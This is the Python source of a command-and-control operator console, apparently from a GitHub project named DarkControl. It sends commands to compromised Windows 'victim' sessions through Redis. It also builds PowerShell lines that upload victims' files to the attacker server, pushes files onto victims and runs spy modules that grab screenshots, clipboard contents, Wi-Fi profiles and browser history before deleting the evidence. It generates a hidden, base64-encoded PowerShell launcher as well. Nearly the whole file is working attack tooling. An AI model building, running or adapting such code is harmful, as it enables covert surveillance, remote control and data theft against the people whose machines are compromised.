"""
https://github.com/HackWidMaddy/DarkControl
This script serves as a command interface for managing a Command and Control (C2) server infrastructure.
It provides functionalities for interacting with remote sessions, executing commands on the local operating system,
generating payloads, managing session aliases, and more.

Dependencies:
- sqlite3: For managing the local SQLite database storing session information.
- tabulate: For formatting session data in a tabular form.
- subprocess: For executing shell commands on the local system.
- json: For loading configuration data from a JSON file.
- uuid: For generating unique identifiers for sessions and payloads.
- base64: For encoding and decoding payloads and file contents.
- sys: For exiting the script.
- pyperclip: For copying generated payloads to the clipboard.
- redis: For communicating with the Redis message broker.
- colorama: For adding color to the console output.
- time: For implementing periodic functions.

Note: This script is part of a larger C2 infrastructure, providing a central hub for managing and orchestrating remote activities on client machines.
"""

import os
import sqlite3
from tabulate import tabulate
import subprocess
import json
import uuid
import base64
import sys
import pyperclip
import redis
from colorama import Fore,Back
from time import sleep
session_name = None

with open('config.json', 'r') as file:
    json_data = json.load(file)
redis_client = redis.StrictRedis(host=str(json_data["Redis_Server_IP_Address"]), port=int(json_data["Redis_Server_Port"]), db=0)
def print_banner():
    banner = """
 ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀ ▄████▄   ▒█████   ███▄    █ ▄▄▄█████▓ ██▀███   ▒█████   ██▓    
 ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██▒    
 ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▒██░    
 ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██░    
 ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░██████▒
  ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░
  ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░
  ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ ░        ░ ░ ░ ▒     ░   ░ ░   ░        ░░   ░ ░ ░ ░ ▒    ░ ░   
    ░          ░  ░   ░     ░  ░   ░ ░          ░ ░           ░             ░         ░ ░      ░  ░
  ░                                ░                                                               
    """
    print(Fore.RED + banner)
    print(Fore.WHITE + "\t\t\t\t\t\t\t\t\t\t ~ HackWidMaddy 👾")
    print(Fore.RESET)

print_banner()

def initialize_cursor():
    conn = sqlite3.connect('DarkControl.db')
    cursor = conn.cursor()
    return cursor, conn

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()


def show_sessions():
    cursor, conn = initialize_cursor()
    try:
        cursor.execute("SELECT * FROM sessions")
        data = cursor.fetchall()
        headers = ['ID', 'Session Name', 'IP Address', 'Alias', 'Last Initialized', 'First Time Initialized']
        print(tabulate(data, headers, tablefmt='heavy_grid'))
    except sqlite3.Error as e:
        print(f"An error occurred: {e}")
    finally:
        conn.close()

def command_not_found():
    print("Command not found. Please try again. Type 'help' to learn more")
    return
def help():
    print(Fore.YELLOW + """
    clear: Clears the screen (Use 'cls' for Windows or 'clear' for Unix-like systems)
    sessions: Lists all active sessions 
    generate: Creates a new payload for exploitation
    interact: Enables interaction with a specific session. Use '-alias' or '-session_name' to specify.
    exec: Executes commands on your local operating system
    alias: Assigns an alias to a session name. Usage: alias <session_name> <alias_name>
    exit: Exits the program
    """ + Fore.RESET + "You'll receive additional help once you enter the 'interact' phase.")


def interact(*args):
    global session_name
    if len(args) != 2 or ('-alias' not in args[0] and '-session_name' not in args[0]):
        print("Oops, wrong usage. Use -alias or -session_name")
        return

    arg_name, value = args[0], args[1]
    alias = value if '-alias' in arg_name else None
    session_name = value if '-session_name' in arg_name else None

    if alias:
        cursor, conn = initialize_cursor()
        cursor.execute("SELECT * FROM sessions WHERE alias=?", (alias,))
        rows = cursor.fetchall()
        conn.close()
        if rows:
            session_name = rows[0][1]
        else:
            print("No session exists with the given alias.")
            return
    cursor, conn = initialize_cursor()
    cursor.execute("select * from sessions where session_name=?",(session_name,))
    rows = cursor.fetchall()
    conn.close()
    if rows:
            session_name = rows[0][1]
    else:
            print("No Session Exists")
            return
        
    print(session_name)
    

    def remote_exec(*args):
        if not args:
            print("Usage remote <command>")
            return


        if len(args) == 1:
            command = args[0]
            redis_client.lpush(f'queue:{session_name}', command)   
        else:
            command = " ".join(args)
            redis_client.lpush(f'queue:{session_name}', command)
            
        
        print("Waiting For Remote Host To Execute Command Output Time May Vary As Per Timing Set don't press ctrl+c or exit the terminal it may lead to instablility in queue if done then flush the queue once :) ")
        while True:
            if command == "exit":
                break
            command = redis_client.lpop(f'result:{session_name}')
            if command:
                print(command.decode('utf-8'))
                break
            else:
                sleep(2)
        return
    def file(*args):
        with open('config.json', 'r') as file:
            json_data = json.load(file)
        if not args:
            print("Usage file <file_path>")
            return
        if len(args) == 1:
            file_path = args[0]
        else:
            file_path = " ".join(args)
        if '$env:USERNAME' in file_path:
            command_get_username = '$env:USERNAME'
            redis_client.lpush(f'queue:{session_name}', command_get_username)
            while True:
                username_result = redis_client.lpop(f'result:{session_name}')
                if username_result:
                    username = username_result.decode('utf-8').strip()
                    break
                else:
                    sleep(2)
        
            file_path =file_path.replace("$env:USERNAME",username)
        command = "$File = " + "'"+f"{file_path}" +"'"+ ";$DestinationURL =" +"'"+ json_data["Server_IP"] + "/file/" + session_name + "'"+"; $BinaryContent = [System.IO.File]::ReadAllBytes($File); $Base64Content = [System.Convert]::ToBase64String($BinaryContent); $FileName = [System.IO.Path]::GetFileName($File); $JsonPayload = @{ fileName = $FileName; fileContent = $Base64Content } | ConvertTo-Json; Invoke-RestMethod -Uri $DestinationURL -Method Post -Body $JsonPayload -ContentType 'application/json'"
        redis_client.lpush(f'queue:{session_name}', command)
        while True:
            command_result = redis_client.lpop(f'result:{session_name}')
            if command_result:
                print(command_result.decode('utf-8'))
                break
            else:
                sleep(2)
        return


    
    def upload(*args):
        with open('config.json', 'r') as file:
            json_data = json.load(file)
        if not args:
            print("Usage upload <file_name> NOTE: File Must Be Present in Transfer directory and note to delete that file after uploading to victim machine")
            return
        print("NOTE: File Must Be Present in Transfer directory and note to delete that file after uploading to victim machine")        
        file_name = " ".join(args)
        command = "$url = "+"'"+ json_data["Server_IP"] + '/transfer/' +session_name+"/"+ file_name + "'"+"; $outputPath = Join-Path $pwd.Path (Split-Path $url -Leaf); try { $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile($url, $outputPath); Write-Host 'File downloaded successfully to $outputPath'; } catch { Write-Host 'Error occurred: $_'; }"
        redis_client.lpush(f'queue:{session_name}', command)
        while True:
            command = redis_client.lpop(f'result:{session_name}')
            if command:
                print(command.decode('utf-8'))
                break
            else:
                sleep(2)
        return
    
    def flush():
        while True:
            queue = redis_client.lpop(f'queue:{session_name}')
            if queue == None or queue == "None":
                break
        while True:
            result = redis_client.lpop(f'result:{session_name}')
            if result == None or result == "None":
                break

    def module(*args):
        module_list = ["spy","fun","network","browser"]
        module_name_list = ["screenshot","rickroll","wlanprofiles","playsound","clipboard","history"]
        if not args:
            print("Usage module <category/module_name>")
            return

        list_module = args[0].split('/')
        if len(list_module) != 2:
            print("Invalid module format. Usage: module <category/module_name>")
            return

        category, module_name = list_module[0], list_module[1]
        if category in module_list and module_name in module_name_list:
            # Load Module
            with open(f'modules/{category}/{module_name}.ps1') as module_file:
                module_contents = module_file.read()
            # Execute the module commands remotely
            if module_name == "playsound":
                upload("main.wav")
            
            remote_exec(module_contents)
            # Download file if applicable
            if module_name == "screenshot":
                file("C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\jndddud.JPEG.JPEG")
                print("Removing screenshot file from remote machine")
                remote_exec("rm C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\jndddud.JPEG.JPEG")
            elif module_name == "wlanprofiles":
                file("C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\profiles.txt")
                print("Removing profiles.txt from remote machine")
                remote_exec("rm C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\profiles.txt")
            elif module_name == "clipboard":
                file("C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\clip.txt")
                print("Removing profiles.txt from remote machine")
                remote_exec("rm C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\clip.txt")
            elif module_name == "history":
                file("C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\browser.txt")
                print("Removing browser.txt from remote machine")
                remote_exec("rm C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\browser.txt")
                print("The paths of available browser history are printed you can use file to download that files :) ")
        else:
            print("No Such Type Of Module Exist")
        return

    def terminate():
        global session_name
        print(Fore.RED + "Are you sure you want to terminate this session you won't be able to connect to this session in future type Yes to go for it :) ", end=' ')
        data = input()
        if data == "YES" or data == "yes" or data == "Yes":
            remote_exec("exit")
            print(Fore.GREEN + "SESSION TERMINATED")
            sleep(2)
            print(Fore.GREEN + "Removing from local db")
            sleep(4)
            cursor, conn = initialize_cursor()
            try:
                cursor.execute("DELETE FROM sessions WHERE session_name=?", (session_name,))
                conn.commit()
                print(Fore.GREEN + "Session terminated and removed from database")
            except sqlite3.Error as e:
                print(Fore.RED + f"Failed to remove session: {e}")
            finally:
                conn.close()
            session_name = None
            main()
        else:
            return
        return
        
    def isalive():
        remote_exec("return 'Hey i am alive :)'")

    def help():
        print("""
        remote: Executes a command on the remote session. Usage: remote <command>
        file: Retrieves a file from the remote session. Usage: file <file_path>
        upload: Uploads a file to the remote session. Usage: upload <file_name>
        flush: Clears the command and result queues.
        module: Executes a predefined module on the remote session. Usage: module <category>/<module_name>
            Available modules:
                spy/screenshot: Takes a screenshot of the victim's screen
                fun/rickroll: Sends a Rickroll link to the victim's browser
                network/wlanprofiles: Retrieves WLAN profiles from the victim's system
                fun/playsound: Plays a sound on the victim's system name of file musty be main.wav and must be present in transfer directory
                spy/clipboard: Retrieves clipboard contents from the victim's system
                browser/history: Retrieves browser history from the victim's system
        terminate: Terminates the current session.
        isalive: Checks if the remote session is alive.
        help: Displays help for available commands in the interact phase.
        clear: Use 'cls' or 'clear' to wipe our screen
        sessions: To list all sessions 
        generate: To generate a new payload
        exec: To execute commands of your own OS
        """)

    interact_commands = {
        "remote": remote_exec,
        "file":file,
        "upload":upload,
        "flush":flush,
        "module":module,
        "terminate":terminate,
        "isalive":isalive,
        "help":help,
        }
    def execute_command_interact(command):
        command_name = command[0]
        arguments = command[1:]
        if command_name in interact_commands:
            interact_commands[command_name](*arguments)
        else:
            command_not_found()





    while True:
        try:
            user_input = input(Back.YELLOW + "DarkControl"+Back.RESET+"("+Back.WHITE+"interact"+Back.RESET+") > ").strip()
            if not user_input:
                user_input = input(Back.YELLOW + "DarkControl"+Back.RESET+"("+Back.WHITE+"interact"+Back.RESET+") > ").strip()
                continue
            if user_input in ["back", "exit"]:
                break
            elif user_input.split()[0] in interact_commands:
                execute_command_interact(user_input.split())
            elif user_input.split()[0] in commands:
                execute_command(user_input.split())
            else:
                command_not_found()
            
        except KeyboardInterrupt:
            flush()
            print("\nSee You Again :)")
            break

def execute_shell_command(*args):
    command = " ".join(args)
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        print("Command Output:\n", result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing the command: {e}")
        print("Command Output:\n", e.stdout)
        print("Command Error Output:\n", e.stderr)
    return
def set_alias(*args):
    mytup = args
    if len(mytup) != 2:
        print("Usage: alias <session_name> <alias_name> | Use _ instead of spaces")
        return
    try:
        cursor, conn = initialize_cursor()
        cursor.execute("SELECT * FROM sessions WHERE session_name=?", (args[0],))
        rows = cursor.fetchall()
        if rows:
            cursor.execute("UPDATE sessions SET alias = ? WHERE session_name = ?;", (args[1], args[0]))
            conn.commit()
            print("Alias updated successfully")
        else:
            print("No session exists with the provided session name")
    except sqlite3.Error as e:
        print(f"An error occurred: {e}")
    finally:
        conn.close()
  
def execute_command(command):
    command_name = command[0]
    arguments = command[1:]
    if command_name in commands:
        commands[command_name](*arguments)
    else:
        command_not_found()

def generate():
    with open('c2_server/templates/ps1_template_windows.ps1') as r:
        script = r.read()
    with open('config.json', 'r') as file:
        json_data = json.load(file)
    script = script.replace("uuid",str(uuid.uuid4()))
    script = script.replace("serverip",str(json_data["Server_IP"]))
    # print(script)
    command_bytes = script.encode('utf-16le')
    # Base64 encode the bytes
    encoded_command = base64.b64encode(command_bytes)
    # Convert the encoded bytes back to a string for printing
    encoded_command_str = encoded_command.decode('utf-8')
    pyperclip.copy('Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -EncodedCommand ' + encoded_command_str + '"')
    print('Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -EncodedCommand ' + encoded_command_str + '"')
    print(Fore.RED + "Payload Copied To Clipboard")

def exit1():
    sys.exit()


# Mapping commands to functions
commands = {
    'clear': clear_screen,
    'cls': clear_screen,
    'sessions': show_sessions,
    'help': help,
    'interact': interact,
    'exec': execute_shell_command,
    'alias': set_alias,
    'generate':generate,
    'exit':exit1,
    # Add exec to run shell commands
    # Add more commands here
}

def periodic_function():
    command = redis_client.lpop('Message')
    if command == "None" or command == None:
        pass
    else:
        print(command.decode('utf-8'))
        main()



def main():
    global session_name
    session_name = None
    print(Fore.GREEN + "Press Enter After Payload Executed On Remote Machine")
    while True:
        # Periodically check for new commands
        periodic_function()
        
        try:
            print(Back.YELLOW + "DarkControl" + Back.RESET + " > ", end="")  # Reset background color before printing prompt
            print(Back.RESET + "", end="")
            user_input = input("").strip().lower().split()
            if user_input:
                execute_command(user_input)
        except KeyboardInterrupt:
            print("\nSee You Again :)")
            break


if __name__ == "__main__":
    # print_banner()
    clear_screen()

    main()
